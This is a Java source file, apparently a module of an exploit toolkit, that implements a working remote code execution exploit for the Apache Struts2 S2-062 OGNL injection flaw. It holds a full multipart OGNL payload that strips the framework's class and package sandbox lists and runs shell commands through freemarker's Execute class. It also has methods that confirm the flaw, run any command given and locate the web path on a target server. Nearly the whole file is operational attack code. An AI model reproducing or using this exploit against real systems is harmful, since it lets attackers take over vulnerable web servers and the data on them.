package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.util.HashMap;
import java.util.List;
import java.util.UUID;

/**
 * @author fullstack 一个混子搬运工
 * @date 2022/4/20
 * @github https://github.com/fullstackcainiao
 */
public class S2_062 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String check_payload = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\n" +
            "Content-Disposition: form-data; name=\"id\"\r\n" +
            "\r\n" +
            "%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
            "(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\n" +
            "(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
            "(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\n" +
            "(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n" +
            "(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\n" +
            "(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n" +
            "(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n" +
            "(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'whoami'}))}\r\n" +
            "------WebKitFormBoundaryl7d1B1aGsV2wcZwF";

    @Override
    public String checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();
        String data = this.check_payload.replace("whoami","echo " + uuid);
        String content1 = "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF";
        this.headers.put("Content-Type",content1);

        Response response = HttpTools.post(this.target,data,this.headers,"UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String data = this.check_payload.replace("whoami",cmd);
        String content1 = "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF";
        this.headers.put("Content-type", content1);

        Response response = HttpTools.post(this.target,data,this.headers,"UTF-8");

        String text1 = response.getText();
        List<String> list = Tools.match(text1, "a", "id");
        String text2 = String.join("------",list);
        return text2;
    }

    @Override
    public String getWebPath() {
        String data = this.check_payload.replace("whoami","pwd");
        String content1 = "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF";
        this.headers.put("Content-type", content1);

        Response response = HttpTools.post(this.target,data,this.headers,"UTF-8");
        String text1 = response.getText();
        List<String> list = Tools.match(text1, "a", "id");
        String text2 = String.join("------",list);

        if (text2 != null){
            return text2;
        }else {
            String data1 = this.check_payload.replace("whoami","chdir");
            String content2 = "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF";
            this.headers.put("Content-type", content2);

            Response response1 = HttpTools.post(this.target,data1,this.headers,"UTF-8");
            String text3 = response1.getText();
            List<String> list1 = Tools.match(text3, "a", "id");
            String text4 = String.join("------",list1);
            return text4;
        }
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
